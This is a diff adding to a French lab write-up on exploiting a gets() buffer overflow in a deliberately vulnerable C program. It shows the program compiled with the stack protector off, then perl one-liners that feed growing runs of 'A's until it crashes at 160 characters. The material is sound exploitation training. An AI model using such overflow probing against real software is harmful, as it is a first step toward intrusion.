@@ -46,7 +46,69 @@ Approche a expliquer....
 
 La fonction `gets()` est signalée comme dangereuse par le compilateur. Il est connu que cette fonction permet un buffer overflow car elle ne limite pas la quantité de données saisies. Cela signifie que si un utilisateur entre plus de 128 caractères (la taille du buffer), les données supplémentaires vont déborder en mémoire, écrasant d'autres variables ou le retour d'adresse du programme.
 
+```bash
+clang -o rop vulnerable.c -m64 -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
 
+vulnerable.c:8:5: warning: implicit declaration of function 'gets' is invalid in C99 [-Wimplicit-function-declaration]
+    gets(buff);
+    ^
+1 warning generated.
+/usr/bin/ld: /tmp/vulnerable-90c7ba.o: in function `main':
+vulnerable.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
+```
 
+## 2.) 
+
+Première série de tests :
+
+```bash
+perl -e 'print "A"x150' | ./rop
+perl -e 'print "A"x200' | ./rop
+perl -e 'print "A"x300' | ./rop
+perl -e 'print "A"x350' | ./rop
+perl -e 'print "A"x400' | ./rop
+
+You password is incorrect
+You password is incorrect
+[1]    1842712 done                perl -e 'print "A"x200' | 
+       1842713 segmentation fault  ./rop
+You password is incorrect
+[1]    1842714 done                perl -e 'print "A"x300' | 
+       1842715 segmentation fault  ./rop
+You password is incorrect
+[1]    1842716 done                perl -e 'print "A"x350' | 
+       1842717 segmentation fault  ./rop
+You password is incorrect
+[1]    1842718 done                perl -e 'print "A"x400' | 
+       1842719 segmentation fault  ./rop
+``` 
+
+Seconde série de tests : 
+
+```bash
+perl -e 'print "A"x160' | ./rop
+perl -e 'print "A"x170' | ./rop
+perl -e 'print "A"x180' | ./rop
+perl -e 'print "A"x190' | ./rop
+perl -e 'print "A"x195' | ./rop
+
+You password is incorrect
+[1]    1842722 done                perl -e 'print "A"x160' | 
+       1842723 segmentation fault  ./rop
+You password is incorrect
+[1]    1842724 done                perl -e 'print "A"x170' | 
+       1842725 segmentation fault  ./rop
+You password is incorrect
+[1]    1842726 done                perl -e 'print "A"x180' | 
+       1842727 segmentation fault  ./rop
+You password is incorrect
+[1]    1842728 done                perl -e 'print "A"x190' | 
+       1842729 segmentation fault  ./rop
+You password is incorrect
+[1]    1842730 done                perl -e 'print "A"x195' | 
+       1842731 segmentation fault  ./rop
+```
+
+150 caractères ne suffisent pas pour causer un segmentation fault, mais à partir de 160 caractères, le buffer déborde et l'écrasement se produit.
 
 
